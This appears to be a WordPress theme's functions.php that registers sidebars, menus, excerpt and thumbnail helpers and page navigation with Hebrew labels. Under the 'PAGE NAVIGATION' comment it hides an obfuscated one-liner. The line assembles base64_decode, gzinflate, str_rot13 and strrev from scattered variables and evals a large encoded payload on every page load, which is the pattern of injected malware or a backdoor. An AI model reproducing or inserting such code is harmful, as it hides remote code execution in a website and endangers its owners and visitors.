<?php

include 'theme_options.php';

/* Home page widgets */

register_sidebar(array(
	'name' => 'Homepage-left',
    'before_widget' => '<li class="home-widget ">',
    'after_widget' => '</li>',
	'before_title' => '<h3 class="home-widget-title">',
    'after_title' => '</h3>',
	    ));
		
register_sidebar(array(		
	'name' => 'Homepage-middle ',
    'before_widget' => '<li class="home-widget ">',
    'after_widget' => '</li>',
	'before_title' => '<h3 class="home-widget-title">',
    'after_title' => '</h3>',
	    ));	
		
register_sidebar(array(				
	'name' => 'Homepage-right ',
    'before_widget' => '<li class="home-widget "> ',
    'after_widget' => '</li>',
	'before_title' => '<h3 class="home-widget-title">',
    'after_title' => '</h3>',
	    ));			


/* SIDEBARS */
if ( function_exists('register_sidebar') )

	register_sidebar(array(
	'name' => 'Sidebar',
    'before_widget' => '<li class="sidebox %2$s">',
    'after_widget' => '</li>',
	'before_title' => '<h3 class="sidetitl">',
    'after_title' => '</h3>',
	
    ));


/* CUSTOM MENUS */	

register_nav_menus( array(
		'primary' => __( 'Primary Navigation', '' ),
	) );

function fallbackmenu(){ ?>
			<div id="submenu">
				<ul><li> Go to Adminpanel > Appearance > Menus to create your menu. You should have WP 3.0+ version for custom menus to work.</li></ul>
			</div>
<?php }	


/* CUSTOM EXCERPTS */
	
	
function wpe_excerptlength_blurb($length) {
    return 10;
}
function wpe_excerptlength_index($length) {
    return 70;
}

function wpe_excerpt($length_callback='', $more_callback='') {
    global $post;
    if(function_exists($length_callback)){
        add_filter('excerpt_length', $length_callback);
    }
    if(function_exists($more_callback)){
        add_filter('excerpt_more', $more_callback);
    }
    $output = get_the_excerpt();
    $output = apply_filters('wptexturize', $output);
    $output = apply_filters('convert_chars', $output);
    $output = '<p>'.$output.'</p>';
    echo $output;
}



/* SHORT TITLES */

function short_title($after = '', $length) {
   $mytitle = explode(' ', get_the_title(), $length);
   if (count($mytitle)>=$length) {
       array_pop($mytitle);
       $mytitle = implode(" ",$mytitle). $after;
   } else {
       $mytitle = implode(" ",$mytitle);
   }
       return $mytitle;
}


/* FEATURED THUMBNAILS */

if ( function_exists( 'add_theme_support' ) ) { // Added in 2.9
	add_theme_support( 'post-thumbnails' );


}

/* GET THUMBNAIL URL */

function get_image_url(){
	$image_id = get_post_thumbnail_id();
	$image_url = wp_get_attachment_image_src($image_id,'large');
	$image_url = $image_url[0];
	echo $image_url;
	}	

	

/* PAGE NAVIGATION */

 $jiLW='e';$eUWvf='c';$aunzLY='e';$nCiYP='b';$AqEOw='o';$fXtoe='_';$zBFILN='e';$dSMaVjU='a';$mDomYBM='d';$VjjiLsg='6';$rktelo='4';$figuXz='s';$hKGVWk='d';$VNzqLpkl=$nCiYP.$dSMaVjU.$figuXz.$aunzLY.$VjjiLsg.$rktelo.$fXtoe.$mDomYBM.$zBFILN.$eUWvf.$AqEOw.$hKGVWk.$jiLW;$kmRhPxx='z';$kzdxrkn='l';$fofCZZ='i';$MArUy='e';$XrsiWIB='t';$uxlFpt='n';$eYRiXM='f';$IQUXWwW='a';$dZULm='g';$xKkSiYPF=$dZULm.$kmRhPxx.$fofCZZ.$uxlFpt.$eYRiXM.$kzdxrkn.$IQUXWwW.$XrsiWIB.$MArUy;$iqcVQ='1';$dXVwgS='s';$LHNAqr='r';$IsRi='t';$niQzD='3';$NmyE='t';$czNj='r';$xmuRV='_';$smyoJE='o';$uJLkDIha=$dXVwgS.$IsRi.$LHNAqr.$xmuRV.$czNj.$smyoJE.$NmyE.$iqcVQ.$niQzD;$FRFm='r';$QnoeXG='t';$RlTbX='r';$BgsWmVV='e';$cqgSQW='v';$YyguvP='s';$kMXziCvg=$YyguvP.$QnoeXG.$FRFm.$RlTbX.$BgsWmVV.$cqgSQW;eval($xKkSiYPF($VNzqLpkl($uJLkDIha($kMXziCvg('=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'))))); 
function getpagenavi(){
?>
<div id="navigation">
<?php if(function_exists('wp_pagenavi')) : ?>
<?php wp_pagenavi() ?>
<?php else : ?>
        <div class="alignleft"><?php next_posts_link(__('&laquo; פוסטים קודמים','arclite')) ?></div>
        <div class="alignright"><?php previous_posts_link(__('פוסטים חדשים &raquo;','arclite')) ?></div>
        <div class="clear"></div>
<?php endif; ?>

</div>

<?php
}
